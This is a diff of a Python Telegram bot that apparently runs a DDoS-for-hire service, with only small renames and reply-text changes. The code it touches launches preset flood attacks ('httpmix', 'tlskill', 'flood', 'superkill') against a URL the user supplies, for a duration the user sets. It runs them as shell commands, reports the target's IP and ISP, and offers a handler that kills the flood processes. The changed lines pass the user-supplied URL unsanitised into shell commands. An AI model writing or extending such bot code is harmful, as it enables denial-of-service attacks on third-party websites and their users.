@@ -46,7 +46,7 @@ initialize_config();TOKEN,ADMIN_IDS,GROUP_ID=check_config()
 async def pkill_handler(update,context):
     if not update.message or not BOT_ACTIVE or(update.message.from_user.id not in ADMIN_IDS and update.message.from_user.id not in load_json(CONFIG_FILE)['vipuserid']):return await update.message.reply_text("Bot is turned off or you do not have permission. ❌")
     killed_pids=[]
-    for cmd in ["http1", "http2", "httpmix", "tlskill", "flood", "get", "browser", "superkill"]:
+    for cmd in ["h1", "h2", "httpmix", "tlskill", "flood", "get", "browser", "superkill"]:
         proc=await asyncio.create_subprocess_shell(f"ps aux | grep '{cmd}' | grep -v grep | awk '{{print $2}}'",stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
         stdout,_=await proc.communicate()
         if stdout:pids=[pid for pid in stdout.decode().strip().split('\n')if pid.strip()];killed_pids.extend(pids);await asyncio.create_subprocess_shell(f"pkill -9 -f {cmd}")
@@ -89,7 +89,7 @@ async def attack_method(update,context):
     if not ip:return await update.message.reply_text("Unable to retrieve IP. Check the URL.")
     command=method['command'].replace(method['url'],url).replace(str(method['time']),str(attack_time))
     isp_info_text=json.dumps(isp_info,indent=2,ensure_ascii=False)if isp_info else'No ISP info.'
-    await update.message.reply_text(f"🚀Attack sent 🚀: {m.upper()}.\nRequested by: {update.message.from_user.username}🎖\nWebsite IP Info:📡\n<pre>{escape(isp_info_text)}</pre>\nDuration: {attack_time}s\nStart Time: {get_vietnam_time()}",parse_mode='HTML',reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌍 Check Status 🔎",url=f"https://check-host.net/check-http?host={url}")]]))
+    await update.message.reply_text(f"🚀Attack Sent Methods🚀: {m.upper()}.\nRequested by: {update.message.from_user.username}🎖\nWebsite IP Info:📡\n<pre>{escape(isp_info_text)}</pre>\nDuration: {attack_time}s\nStart Time: {get_vietnam_time()}",parse_mode='HTML',reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌍 Check Status 🔎",url=f"https://check-host.net/check-http?host={url}")]]))
     st=time.time();proc=await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE);user_processes[uid]={'process':proc,'start_time':st,'attack_time':attack_time}
     asyncio.create_task(execute_attack(command,update,m,st,attack_time,uid))
 
